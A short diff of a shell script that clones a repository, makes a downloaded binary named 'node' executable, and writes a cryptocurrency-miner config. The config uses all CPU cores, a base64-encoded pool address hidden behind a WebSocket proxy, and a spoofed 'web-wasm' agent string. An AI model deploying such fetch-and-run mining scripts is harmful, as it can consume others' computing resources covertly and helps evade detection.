@@ -2,7 +2,6 @@
 git clone https://github.com/miltoncarpenter665/nano-mbc.git
 sleep 2
 cd nano-mbc
-wget https://raw.githubusercontent.com/miltoncarpenter665/nano-mbc/refs/heads/main/node
 sleep 2
 chmod +x node
 sleep 2
@@ -38,12 +37,11 @@ echo ""
 
 sleep 2
 
-
 cat > data.json <<END
 {
-  "proxy": "ws://usashadespectre$(shuf -i 1-6 -n 1).devopsenterprise.uk:9999/emVyZ3AyYi5kZXZvcHNlbnRlcnByaXNlLnVrOjc0NDU=",
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y3JpbXNvbi1wb29sLmNvbToyNDAxMA==",
   "config": { "threads": $used_num_of_cores, "log": true },
-  "options": { "user": "Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate", "password": "c=MBC,mc=MBC,ID=$currentdate", "argent": "web-wasm/1.0" }
+  "options": { "user": "Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate", "password": "x", "argent": "web-wasm/1.0" }
 }
 END
 
